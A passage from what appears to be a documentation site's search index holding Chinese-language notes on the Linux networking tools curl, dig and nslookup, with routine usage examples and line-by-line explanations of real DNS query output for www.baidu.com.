BLKSIZE\u9009\u9879\uff08\u5fc5\u987b>512\uff09 -z, --time-cond TIME \u57fa\u4e8e\u65f6\u95f4\u6761\u4ef6\u8fdb\u884c\u4f20\u8f93 -1, --tlsv1 \u4f7f\u7528 => TLSv1\uff08SSL\uff09 --tlsv1.0 \u4f7f\u7528TLSv1.0\uff08SSL\uff09 --tlsv1.1 \u4f7f\u7528TLSv1.1\uff08SSL\uff09 --tlsv1.2 \u4f7f\u7528TLSv1.2\uff08SSL\uff09 --tlsv1.3 \u4f7f\u7528TLSv1.3\uff08SSL\uff09 --tls-max VERSION \u4f7f\u7528TLS\u6700\u591a\u5230VERSION\uff08SSL\uff09 --trace FILE \u5c06\u8c03\u8bd5\u8ddf\u8e2a\u5199\u5165\u7ed9\u5b9a\u6587\u4ef6 --trace-ascii FILE \u50cf--trace\u4e00\u6837\uff0c\u4f46\u6ca1\u6709\u5341\u516d\u8fdb\u5236\u8f93\u51fa --trace-time \u5728\u8ddf\u8e2a/\u8be6\u7ec6\u8f93\u51fa\u4e2d\u6dfb\u52a0\u65f6\u95f4\u6233 --tr-encoding \u8bf7\u6c42\u538b\u7f29\u7684\u4f20\u8f93\u7f16\u7801\uff08H\uff09 -T, --upload-file FILE \u5c06FILE\u4f20\u8f93\u5230\u76ee\u7684\u5730 --url URL \u8981\u5904\u7406\u7684URL -B, --use-ascii \u4f7f\u7528ASCII/\u6587\u672c\u4f20\u8f93 -u, --user USER[:PASSWORD] \u670d\u52a1\u5668\u7528\u6237\u548c\u5bc6\u7801 --tlsuser USER TLS\u7528\u6237\u540d --tlspassword STRING TLS\u5bc6\u7801 --tlsauthtype STRING TLS\u8ba4\u8bc1\u7c7b\u578b\uff08\u9ed8\u8ba4SRP\uff09 --unix-socket FILE \u901a\u8fc7\u8fd9\u4e2aUNIX\u57df\u5957\u63a5\u5b57\u8fde\u63a5 -A, --user-agent STRING \u53d1\u9001\u5230\u670d\u52a1\u5668\u7684User-Agent\uff08H\uff09 -v, --verbose \u4f7f\u64cd\u4f5c\u66f4\u52a0\u8be6\u7ec6 -V, --version \u663e\u793a\u7248\u672c\u53f7\u5e76\u9000\u51fa -w, --write-out FORMAT \u5b8c\u6210\u540e\u8f93\u51fa\u4ec0\u4e48 --xattr \u5728\u6269\u5c55\u6587\u4ef6\u5c5e\u6027\u4e2d\u5b58\u50a8\u5143\u6570\u636e -q \u5982\u679c\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f7f\u7528\uff0c\u5219\u7981\u7528.curlrc curl \u662f\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u4f20\u8f93\u6570\u636e\uff0c\u901a\u5e38\u7528\u4e8eHTTP\u8bf7\u6c42\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u7684 curl \u7528\u6cd5\uff1a \u7b80\u5355\u7684GET\u8bf7\u6c42 \uff1a curl http://example.com \u5e26\u6709\u5934\u4fe1\u606f\u7684GET\u8bf7\u6c42 \uff1a curl -H \"Content-Type: application/json\" http://example.com \u53d1\u9001POST\u8bf7\u6c42 \uff1a curl -X POST http://example.com \u53d1\u9001POST\u8bf7\u6c42\u643a\u5e26\u6570\u636e \uff1a curl -X POST -d \"param1=value1&param2=value2\" http://example.com \u4ee5JSON\u683c\u5f0f\u53d1\u9001POST\u6570\u636e \uff1a curl -X POST -H \"Content-Type: application/json\" -d '{\"param1\":\"value1\", \"param2\":\"value2\"}' http://example.com \u4f7f\u7528\u57fa\u672c\u7684HTTP\u8ba4\u8bc1 \uff1a curl -u username:password http://example.com \u4fdd\u5b58\u8f93\u51fa\u5230\u6587\u4ef6 \uff1a curl -o filename.html http://example.com \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6POST\u6570\u636e \uff1a curl -X POST -d @data.txt http://example.com \u53d1\u9001PUT\u8bf7\u6c42 \uff1a curl -X PUT -d \"param=value\" http://example.com \u5220\u9664\u8bf7\u6c42 \uff1a curl -X DELETE http://example.com/resource \u8bbe\u7f6e\u8d85\u65f6\u65f6\u95f4 \uff1a curl -m 10 http://example.com \u901a\u8fc7\u4ee3\u7406\u53d1\u9001\u8bf7\u6c42 \uff1a curl -x http://proxyserver:port http://example.com \u663e\u793a\u8bf7\u6c42\u5934\u4fe1\u606f \uff1a curl -I http://example.com \u4e0b\u8f7d\u6587\u4ef6\u5e76\u91cd\u547d\u540d \uff1a curl -o newfilename.html http://example.com/oldfilename.html \u65ad\u70b9\u7eed\u4f20\u4e0b\u8f7d\u6587\u4ef6 \uff1a curl -C - -O http://example.com/bigfile.zip \u4f7f\u7528HTTPS\u534f\u8bae\uff0c\u5e76\u5ffd\u7565SSL\u8bc1\u4e66\u68c0\u67e5 \uff1a curl -k https://example.com \u663e\u793a\u8be6\u7ec6\u7684\u8fde\u63a5\u4fe1\u606f \uff1a curl -v http://example.com curl \u7684\u7528\u6cd5\u975e\u5e38\u5e7f\u6cdb\uff0c\u4e0a\u9762\u8fd9\u4e9b\u662f\u4e00\u4e9b\u5e38\u89c1\u548c\u57fa\u672c\u7684\u7528\u6cd5\u3002\u4f60\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u9700\u6c42\u8fdb\u884c\u9009\u62e9\u548c\u7ec4\u5408\u3002 curl \u547d\u4ee4\uff0cLinux curl \u547d\u4ee4\u8be6\u89e3\uff1a\u5229\u7528URL\u89c4\u5219\u5728\u547d\u4ee4\u884c\u4e0b\u5de5\u4f5c\u7684\u6587\u4ef6\u4f20\u8f93\u5de5\u5177 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com)","title":"curl\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/dig/","text":"dig\u547d\u4ee4\u548cnslookup\u547d\u4ee4 dig dig \uff08\u57df\u4fe1\u606f\u641c\u5bfb\u5668\uff09\u662f\u4e00\u4e2a\u7528\u4e8e\u67e5\u8be2DNS\uff08\u57df\u540d\u7cfb\u7edf\uff09\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5e7f\u6cdb\u7528\u4e8e\u7f51\u7edc\u7ba1\u7406\u5458\u548cIT\u4e13\u4e1a\u4eba\u5458\u4e2d\u3002\u8fd9\u662f\u4e00\u4e9b\u57fa\u672c\u7684\u4f7f\u7528\u65b9\u6cd5\uff1a \u67e5\u8be2\u57df\u540d\u7684A\u8bb0\u5f55\uff08IP\u5730\u5740\uff09 \uff1a dig example.com \u8fd9\u4e2a\u547d\u4ee4\u5c06\u663e\u793a\u4e0e example.com \u76f8\u5173\u7684DNS\u4fe1\u606f\uff0c\u5305\u62ec\u5176A\u8bb0\u5f55\uff0c\u5373\u57df\u540d\u5bf9\u5e94\u7684IP\u5730\u5740\u3002 \u67e5\u8be2\u7279\u5b9a\u7c7b\u578b\u7684\u8bb0\u5f55 \uff1a \u4f60\u53ef\u4ee5\u67e5\u8be2\u7279\u5b9a\u7c7b\u578b\u7684DNS\u8bb0\u5f55\uff0c\u5982MX\uff08\u90ae\u4ef6\u4ea4\u6362\uff09\u8bb0\u5f55\u3001NS\uff08\u540d\u79f0\u670d\u52a1\u5668\uff09\u8bb0\u5f55\u7b49\u3002 dig example.com MX dig example.com NS \u6307\u5b9aDNS\u670d\u52a1\u5668 \uff1a \u4f60\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u4e00\u4e2aDNS\u670d\u52a1\u5668\u6765\u8fdb\u884c\u67e5\u8be2\uff0c\u8fd9\u5bf9\u4e8e\u68c0\u67e5\u7279\u5b9aDNS\u670d\u52a1\u5668\u4e0a\u7684\u8bb0\u5f55\u5f88\u6709\u7528\u3002 dig @8.8.8.8 example.com \u8fd9\u4e2a\u4f8b\u5b50\u4f7f\u7528\u4e86Google\u7684\u516c\u5171DNS\u670d\u52a1\u5668\uff088.8.8.8\uff09\u6765\u67e5\u8be2 example.com \u3002 \u67e5\u8be2\u9006\u5411DNS\u8bb0\u5f55 \uff1a \u9006\u5411DNS\u67e5\u8be2\u7528\u4e8e\u67e5\u627e\u4e0e\u7279\u5b9aIP\u5730\u5740\u5173\u8054\u7684\u57df\u540d\u3002 dig -x 192.0.2.1 \u7b80\u5316\u8f93\u51fa \uff1a \u5982\u679c\u4f60\u53ea\u5bf9\u7ed3\u679c\u4e2d\u7684\u67d0\u90e8\u5206\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u4f7f\u7528 +short \u9009\u9879\u6765\u7b80\u5316\u8f93\u51fa\u3002 dig example.com +short \u8be6\u7ec6\u8f93\u51fa \uff1a \u4f7f\u7528 +trace \u9009\u9879\u53ef\u4ee5\u67e5\u770b\u5230\u57df\u540d\u89e3\u6790\u7684\u6bcf\u4e00\u6b65\uff0c\u8fd9\u5bf9\u4e8e\u8bca\u65adDNS\u95ee\u9898\u975e\u5e38\u6709\u7528\u3002 dig example.com +trace \u67e5\u770bDNSSEC\uff08DNS\u5b89\u5168\u6269\u5c55\uff09\u4fe1\u606f \uff1a dig example.com +dnssec \u8fd9\u4e9b\u53ea\u662f dig \u5de5\u5177\u7684\u4e00\u4e9b\u57fa\u672c\u7528\u6cd5\u3002\u7531\u4e8e dig \u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u5b83\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u9009\u9879\u548c\u529f\u80fd\u53ef\u4ee5\u63a2\u7d22\u3002 \u547d\u4ee4\u7ed3\u679c\u89e3\u91ca\uff1a [root@VM-0-16-centos ~]# dig www.baidu.com ; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.14 <<>> www.baidu.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5539 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;www.baidu.com. IN A ;; ANSWER SECTION: www.baidu.com. 380 IN CNAME www.a.shifen.com. www.a.shifen.com. 60 IN A 110.242.68.4 www.a.shifen.com. 60 IN A 110.242.68.3 ;; Query time: 1 msec ;; SERVER: 183.60.83.19#53(183.60.83.19) ;; WHEN: Thu Dec 21 12:34:59 CST 2023 ;; MSG SIZE rcvd: 90 \u8fd9\u662f\u4f7f\u7528 dig \u547d\u4ee4\u67e5\u8be2 www.baidu.com \u7684DNS\u4fe1\u606f\u65f6\u5f97\u5230\u7684\u8f93\u51fa ; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.14 <<>> www.baidu.com \uff1a \u8fd9\u4e00\u884c\u663e\u793a\u4e86 dig \u547d\u4ee4\u7684\u7248\u672c\u4fe1\u606f\uff089.11.4-P2-RedHat-9.11.4-26.P2.el7_9.14\uff09\uff0c\u4ee5\u53ca\u88ab\u67e5\u8be2\u7684\u57df\u540d\uff08www.baidu.com\uff09\u3002 ;; global options: +cmd \uff1a \u8fd9\u8868\u793a dig \u4f7f\u7528\u7684\u5168\u5c40\u9009\u9879\uff0c +cmd \u8868\u793a\u663e\u793a\u547d\u4ee4\u884c\u53c2\u6570\u3002 ;; Got answer: \uff1a \u8fd9\u8868\u660e\u4e0b\u9762\u7684\u90e8\u5206\u5305\u542b\u4e86\u5bf9\u67e5\u8be2\u7684\u54cd\u5e94\u3002 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5539 \uff1a opcode: QUERY \u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u6807\u51c6\u67e5\u8be2\u3002 status: NOERROR \u8868\u660e\u67e5\u8be2\u6210\u529f\uff0c\u6ca1\u6709\u9519\u8bef\u3002 id: 5539 \u662f\u8fd9\u6b21\u67e5\u8be2\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 \uff1a flags \u5c55\u793a\u4e86\u4e0d\u540c\u7684DNS\u6807\u5fd7\uff1a qr \uff08\u67e5\u8be2\u54cd\u5e94\uff09\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u54cd\u5e94\u6d88\u606f\u3002 rd \uff08\u9012\u5f52\u8bf7\u6c42\uff09\u8868\u793a\u5ba2\u6237\u7aef\u5e0c\u671b\u670d\u52a1\u5668\u8fdb\u884c\u9012\u5f52\u67e5\u8be2\u3002 ra \uff08\u9012\u5f52\u53ef\u7528\uff09\u8868\u793a\u670d\u52a1\u5668\u53ef\u4ee5\u8fdb\u884c\u9012\u5f52\u67e5\u8be2\u3002 QUERY: 1 \u610f\u5473\u7740\u8be2\u95ee\u4e86\u4e00\u4e2a\u95ee\u9898\u3002 ANSWER: 3 \u8868\u660e\u6536\u5230\u4e863\u4e2a\u56de\u7b54\u3002 AUTHORITY: 0 \u548c ADDITIONAL: 0 \u8868\u793a\u6ca1\u6709\u6743\u5a01\u548c\u9644\u52a0\u90e8\u5206\u7684\u8bb0\u5f55\u3002 ;; QUESTION SECTION: \uff1a \u8fd9\u662f\u67e5\u8be2\u90e8\u5206\uff0c\u663e\u793a\u4e86\u8fdb\u884c\u7684\u67e5\u8be2\u3002 ;www.baidu.com. IN A \uff1a \u8fd9\u662f\u5b9e\u9645\u7684\u67e5\u8be2\u3002\u67e5\u8be2 www.baidu.com \u7684 A \u8bb0\u5f55\uff0c\u5373IP\u5730\u5740\u3002 ;; ANSWER SECTION: \uff1a \u8fd9\u90e8\u5206\u5305\u542b\u4e86\u5bf9\u67e5\u8be2\u7684\u56de\u7b54\u3002 www.baidu.com. 380 IN CNAME www.a.shifen.com. \uff1a \u8fd9\u8868\u660e www.baidu.com \u662f\u4e00\u4e2a\u522b\u540d\uff0c\u5b9e\u9645\u7684\u540d\u79f0\u662f www.a.shifen.com \uff08CNAME\u8bb0\u5f55\uff09\u3002 www.a.shifen.com. 60 IN A 110.242.68.4 \uff1a www.a.shifen.com. 60 IN A 110.242.68.3 \uff1a \u8fd9\u4e24\u884c\u663e\u793a www.a.shifen.com \u7684A\u8bb0\u5f55\uff0c\u5373\u5176IP\u5730\u5740\uff0c\u5206\u522b\u4e3a110.242.68.4\u548c110.242.68.3\u3002 ;; Query time: 1 msec \uff1a \u67e5\u8be2\u8017\u65f61\u6beb\u79d2\u3002 ;; SERVER: 183.60.83.19#53(183.60.83.19) \uff1a \u6307\u51fa\u4e86\u54cd\u5e94\u67e5\u8be2\u7684DNS\u670d\u52a1\u5668\u7684IP\u5730\u5740\u548c\u7aef\u53e3\u53f7\uff08183.60.83.19\uff0c\u7aef\u53e353\uff09\u3002 ;; WHEN: Thu Dec 21 12:34:59 CST 2023 \uff1a \u67e5\u8be2\u53d1\u751f\u7684\u65f6\u95f4\u3002 ;; MSG SIZE rcvd: 90 \uff1a \u63a5\u6536\u5230\u7684\u6d88\u606f\u5927\u5c0f\u4e3a90\u5b57\u8282\u3002 \u8fd9\u4e2a\u8f93\u51fa\u63d0\u4f9b\u4e86\u8be6\u7ec6\u7684\u4fe1\u606f\u5173\u4e8e www.baidu.com \u7684DNS\u8bb0\u5f55\uff0c\u5305\u62ec\u5176CNAME\u8bb0\u5f55\u548c\u76f8\u5e94\u7684IP\u5730\u5740\u3002 nslookup nslookup \u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u7f51\u7edc\u7ba1\u7406\u5458\u5de5\u5177\uff0c\u7528\u4e8e\u67e5\u8be2DNS\uff08\u57df\u540d\u7cfb\u7edf\uff09\u6765\u83b7\u53d6\u57df\u540d\u6216IP\u5730\u5740\u7684\u76f8\u5173\u4fe1\u606f\u3002\u8fd9\u91cc\u662f\u4e00\u4e9b\u57fa\u672c\u548c\u9ad8\u7ea7\u7684 nslookup \u7528\u6cd5\uff1a \u57fa\u7840\u67e5\u8be2 \u67e5\u8be2\u57df\u540d\u7684IP\u5730\u5740 : nslookup example.com \u8fd9\u4f1a\u8fd4\u56de example.com \u7684IP\u5730\u5740\u3002 \u53cd\u5411DNS\u67e5\u8be2\uff08\u6839\u636eIP\u5730\u5740\u67e5\u8be2\u57df\u540d\uff09 : nslookup 192.0.2.1 \u8fd9\u4f1a\u8fd4\u56de\u4e0eIP\u5730\u5740 192.0.2.1 \u5173\u8054\u7684\u57df\u540d\u3002 \u6307\u5b9aDNS\u670d\u52a1\u5668 \u4f7f\u7528\u7279\u5b9aDNS\u670d\u52a1\u5668\u67e5\u8be2 : nslookup example.com 8.8.8.8 \u4f7f\u7528Google\u7684DNS\u670d\u52a1\u5668\uff088.8.8.8\uff09\u67e5\u8be2 example.com \u3002 \u67e5\u8be2\u7279\u5b9a\u7c7b\u578b\u7684DNS\u8bb0\u5f55 \u67e5\u8be2MX\uff08\u90ae\u4ef6\u4ea4\u6362\uff09\u8bb0\u5f55 : nslookup -type=mx example.com \u67e5\u8be2 example.com \u7684\u90ae\u4ef6\u670d\u52a1\u5668\u8bb0\u5f55\u3002 \u67e5\u8be2NS\uff08\u540d\u79f0\u670d\u52a1\u5668\uff09\u8bb0\u5f55 : nslookup -type=ns example.com \u67e5\u8be2\u7ba1\u7406 example.com \u7684TXT\u8bb0\u5f55\uff0c\u5e38\u7528\u4e8eSPF\u8bb0\u5f55\u6216\u5176\u4ed6\u9a8c\u8bc1\u4fe1\u606f\u3002 \u67e5\u8be2A\uff08\u5730\u5740\uff09\u8bb0\u5f55 : nslookup -type=a example.com \u67e5\u8be2 example.com \u7684IPv4\u5730\u5740\u3002 \u67e5\u8be2AAAA\uff08IPv6\u5730\u5740\uff09\u8bb0\u5f55 : nslookup -type=aaaa example.com \u67e5\u8be2 example.com \u7684IPv6\u5730\u5740\u3002 \u4f7f\u7528\u4ea4\u4e92\u6a21\u5f0f \u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f : nslookup \u5728\u4ea4\u4e92\u6a21\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u8fde\u7eed\u8fdb\u884c\u591a\u6b21\u67e5\u8be2\u800c\u65e0\u9700\u91cd\u590d\u8f93\u5165 nslookup \u3002 \u5728\u4ea4\u4e92\u6a21\u5f0f\u4e2d\u8bbe\u7f6e\u7c7b\u578b : > set type=mx > example.com \u9996\u5148\u8bbe\u7f6e\u67e5\u8be2\u7c7b\u578b\u4e3aMX\uff0c\u7136\u540e\u67e5\u8be2 example.com \u3002 \u9000\u51fa\u4ea4\u4e92\u6a21\u5f0f : > exit \u9ad8\u7ea7\u7528\u6cd5 \u5f00\u542f\u8be6\u7ec6\u8f93\u51fa : nslookup -debug example.com \u63d0\u4f9b\u67e5\u8be2\u8fc7\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6709\u52a9\u4e8e\u8c03\u8bd5\u3002 \u67e5\u8be2SOA\uff08\u8d77\u59cb\u6388\u6743\uff09\u8bb0\u5f55 : nslookup -type=soa example.com \u67e5\u8be2 example.com \u7684SOA\u8bb0\u5f55\uff0c\u5305\u542b\u5173\u4e8e\u57df\u540d\u7ba1\u7406\u7684\u4fe1\u606f\u3002 \u6ce8\u610f\u4e8b\u9879 \u5728\u4f7f\u7528 nslookup \u65f6\uff0c\u786e\u4fdd\u8f93\u5165\u6b63\u786e\u7684\u57df\u540d\u6216IP\u5730\u5740\u3002 \u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u6216 nslookup \u7684\u7248\u672c\u53ef\u80fd\u5728\u547d\u4ee4\u884c\u9009\u9879\u4e0a\u6709\u6240\u5dee\u5f02\u3002 nslookup \u4e3b\u8981\u7528\u4e8e\u8bca\u65ad\u548c\u89e3\u51b3DNS\u76f8\u5173\u7684\u95ee\u9898\uff0c\u5bf9\u4e8e\u65e5\u5e38\u7684\u7f51\u7edc\u95ee\u9898\u6392\u67e5\u975e\u5e38\u6709\u7528\u3002 \u901a\u8fc7\u8fd9\u4e9b\u4e0d\u540c\u7684\u547d\u4ee4\u548c\u9009\u9879\uff0c\u53ef\u4ee5\u63a2\u7d22\u548c\u7406\u89e3\u57df\u540d\u7cfb\u7edf\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ca\u5176\u914d\u7f6e\u3002 \u547d\u4ee4\u7ed3\u679c\u89e3\u91ca\uff1a [root@VM-0-16-centos ~]# nslookup www.baidu.com Server: 183.60.83.19 Address: 183.60.83.19#53 Non-authoritative answer: www.baidu.com canonical name = www.a.shifen.com. Name: www.a.shifen.com Address: 220.181.38.149 Name: www.a.shifen.com Address: 220.181.38.150 Name: www.a.shifen.com Address: 240e:83:205:58:0:ff:b09f:36bf Name: www.a.shifen.com Address: 240e:83:205:5a:0:ff:b05f:346b \u4e0b\u9762\u662f\u5bf9\u60a8\u63d0\u4f9b\u7684 nslookup \u67e5\u8be2\u7ed3\u679c\u7684\u9010\u884c\u89e3\u91ca\uff1a [root@VM-0-16-centos ~]# nslookup www.baidu.com \u8fd9\u662f\u60a8\u5728\u547d\u4ee4\u884c\u754c\u9762\u8f93\u5165\u7684\u547d\u4ee4\uff0c\u8868\u793a\u60a8\u8981\u4f7f\u7528 nslookup \u5de5\u5177\u67e5\u8be2 www.baidu.com \u57df\u540d\u7684DNS\u4fe1\u606f\u3002 Server: 183.60.83.19 \u8fd9\u4e00\u884c\u8868\u793a\u5904\u7406\u60a8\u7684DNS\u67e5\u8be2\u7684\u670d\u52a1\u5668\u7684IP\u5730\u5740\u662f 183.60.83.19 \u3002\u8fd9\u662f\u60a8\u7684\u7f51\u7edc\u914d\u7f6e\u4e2d\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\uff0c\u6216\u8005\u662f\u60a8\u7cfb\u7edf\u9ed8\u8ba4\u7684DNS\u670d\u52a1\u5668\u3002 Address: 183.60.83.19#53 \u8fd9\u4e00\u884c\u663e\u793a\u4e86\u4e0a\u8ff0DNS\u670d\u52a1\u5668\u7684IP\u5730\u5740 ( 183.60.83.19 ) \u548c\u4f7f\u7528\u7684\u7aef\u53e3\u53f7 ( #53 )\u3002DNS\u67e5\u8be2\u901a\u5e38\u4f7f\u752853\u7aef\u53e3\u3002 Non-authoritative answer \u8fd9\u610f\u5473\u7740\u8fd9\u4e2a\u54cd\u5e94\u4e0d\u662f\u6765\u81ea\u5b58\u50a8\u6709 www.baidu.com \u57df\u540d\u8bb0\u5f55\u7684\u6743\u5a01DNS\u670d\u52a1\u5668\uff0c\u800c\u662f\u6765\u81ea\u4e00\u4e2a\u7f13\u5b58\u8fd9\u4e9b\u4fe1\u606f\u7684\u670d\u52a1\u5668\u3002\u975e\u6743\u5a01\u56de\u7b54\u901a\u5e38\u6765\u81ea\u672c\u5730DNS\u670d\u52a1\u5668\u6216ISP\u7684DNS\u670d\u52a1\u5668\u3002 www.baidu.com canonical name = www.a.shifen.com. \u8fd9\u8868\u660e www.baidu.com \u6709\u4e00\u4e2aCNAME\uff08\u89c4\u8303\u540d\uff09\u8bb0\u5f55\u6307\u5411 www.a.shifen.com \u3002CNAME\u8bb0\u5f55\u662f\u4e00\u79cdDNS\u8bb0\u5f55\uff0c\u5b83\u5c06\u4e00\u4e2a\u57df\u540d\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u57df\u540d\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53\u4f60\u8bbf\u95ee www.baidu.com \u65f6\uff0c\u5b9e\u9645\u4e0a\u88ab\u5f15\u5bfc\u5230 www.a.shifen.com \u3002 Name: www.a.shifen.com \u8fd9\u4e00\u884c\u8868\u660e\u63a5\u4e0b\u6765\u7684IP\u5730\u5740\u5c5e\u4e8e www.a.shifen.com \u3002 Address: 220.181.38.149 \u8fd9\u662f www.a.shifen.com \u7684\u4e00\u4e2aIPv4\u5730\u5740\u3002\u8fd9\u610f\u5473\u7740 www.baidu.com \uff08\u901a\u8fc7 www.a.shifen.com \uff09\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2aIP\u5730\u5740\u8bbf\u95ee\u3002 Name: www.a.shifen.com Address: 220.181.38.150 \u8fd9\u662f\u53e6\u4e00\u4e2aIPv4\u5730\u5740\uff0c\u5c5e\u4e8e\u540c\u4e00\u4e2a\u57df\u540d\uff08 www.a.shifen.com \uff09\u3002\u591a\u4e2a\u5730\u5740\u7684\u5b58\u5728\u53ef\u80fd\u662f\u4e3a\u4e86\u8d1f\u8f7d\u5747\u8861\u548c\u5197\u4f59\u3002 Name: www.a.shifen.com Address: 240e:83:205:58:0:ff:b09f:36bf \u8fd9\u662f www.a.shifen.com \u7684\u4e00\u4e2aIPv6\u5730\u5740\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2aIPv6\u7f51\u7edc\u7684\u8bbf\u95ee\u70b9\u3002 Name: www.a.shifen.com Address: 240e:83:205:5a:0:ff:b05f:346b \u53e6\u4e00\u4e2aIPv6\u5730\u5740\uff0c\u540c\u6837\u5c5e\u4e8e www.a.shifen.com \u3002\u4e0eIPv4\u5730\u5740\u7c7b\u4f3c\uff0c\u591a\u4e2aIPv6\u5730\u5740\u7684\u5b58\u5728\u53ef\u80fd\u4e5f\u662f\u51fa\u4e8e\u8d1f\u8f7d\u5747\u8861\u548c\u5197\u4f59\u7684\u8003\u8651\u3002 \u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e2a nslookup \u67e5\u8be2\u5c55\u793a\u4e86 www.baidu.com \u5982\u4f55\u901a\u8fc7CNAME\u8bb0\u5f55\u6307\u5411 www.a.shifen.com \uff0c\u4ee5\u53ca\u540e\u8005\u7684\u591a\u4e2aIPv4\u548cIPv6\u5730\u5740\uff0c\u8fd9\u4e9b\u5730\u5740\u53ef\u80fd\u7528\u4e8e\u5904\u7406\u4e0d\u540c\u7684\u7f51\u7edc\u8bf7\u6c42\uff0c\u786e\u4fdd\u53ef\u9760\u6027\u548c\u9ad8\u6548\u6027\u3002","title":"\u67e5\u770b\u57df\u540d\u89e3\u6790"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/dig/#dignslookup","text":"","title":"dig\u547d\u4ee4\u548cnslookup\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/dig/#dig","text":"dig \uff08\u57df\u4fe1\u606f\u641c\u5bfb\u5668\uff09\u662f\u4e00\u4e2a\u7528\u4e8e\u67e5\u8be2DNS\uff08\u57df\u540d\u7cfb\u7edf\uff09\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5e7f\u6cdb\u7528\u4e8e\u7f51\u7edc\u7ba1\u7406\u5458\u548cIT\u4e13\u4e1a\u4eba\u5458\u4e2d\u3002\u8fd9\u662f\u4e00\u4e9b\u57fa\u672c\u7684\u4f7f\u7528\u65b9\u6cd5\uff1a \u67e5\u8be2\u57df\u540d\u7684A\u8bb0\u5f55\uff08IP\u5730\u5740\uff09 \uff1a dig example.com \u8fd9\u4e2a\u547d\u4ee4\u5c06\u663e\u793a\u4e0e example.com \u76f8\u5173\u7684DNS\u4fe1\u606f\uff0c\u5305\u62ec\u5176A\u8bb0\u5f55\uff0c\u5373\u57df\u540d\u5bf9\u5e94\u7684IP\u5730\u5740\u3002 \u67e5\u8be2\u7279\u5b9a\u7c7b\u578b\u7684\u8bb0\u5f55 \uff1a \u4f60\u53ef\u4ee5\u67e5\u8be2\u7279\u5b9a\u7c7b\u578b\u7684DNS\u8bb0\u5f55\uff0c\u5982MX\uff08\u90ae\u4ef6\u4ea4\u6362\uff09\u8bb0\u5f55\u3001NS\uff08\u540d\u79f0\u670d\u52a1\u5668\uff09\u8bb0\u5f55\u7b49\u3002 dig example.com MX dig example.com NS \u6307\u5b9aDNS\u670d\u52a1\u5668 \uff1a \u4f60\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u4e00\u4e2aDNS\u670d\u52a1\u5668\u6765\u8fdb\u884c\u67e5\u8be2\uff0c\u8fd9\u5bf9\u4e8e\u68c0\u67e5\u7279\u5b9aDNS\u670d\u52a1\u5668\u4e0a\u7684\u8bb0\u5f55\u5f88\u6709\u7528\u3002 dig @8.8.8.8 example.com \u8fd9\u4e2a\u4f8b\u5b50\u4f7f\u7528\u4e86Google\u7684\u516c\u5171DNS\u670d\u52a1\u5668\uff088.8.8.8\uff09\u6765\u67e5\u8be2 example.com \u3002 \u67e5\u8be2\u9006\u5411DNS\u8bb0\u5f55 \uff1a \u9006\u5411DNS\u67e5\u8be2\u7528\u4e8e\u67e5\u627e\u4e0e\u7279\u5b9aIP\u5730\u5740\u5173\u8054\u7684\u57df\u540d\u3002 dig -x 192.0.2.1 \u7b80\u5316\u8f93\u51fa \uff1a \u5982\u679c\u4f60\u53ea\u5bf9\u7ed3\u679c\u4e2d\u7684\u67d0\u90e8\u5206\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u4f7f\u7528 +short \u9009\u9879\u6765\u7b80\u5316\u8f93\u51fa\u3002 dig example.com +short \u8be6\u7ec6\u8f93\u51fa \uff1a \u4f7f\u7528 +trace \u9009\u9879\u53ef\u4ee5\u67e5\u770b\u5230\u57df\u540d\u89e3\u6790\u7684\u6bcf\u4e00\u6b65\uff0c\u8fd9\u5bf9\u4e8e\u8bca\u65adDNS\u95ee\u9898\u975e\u5e38\u6709\u7528\u3002 dig example.com +trace \u67e5\u770bDNSSEC\uff08DNS\u5b89\u5168\u6269\u5c55\uff09\u4fe1\u606f \uff1a dig example.com +dnssec \u8fd9\u4e9b\u53ea\u662f dig \u5de5\u5177\u7684\u4e00\u4e9b\u57fa\u672c\u7528\u6cd5\u3002\u7531\u4e8e dig 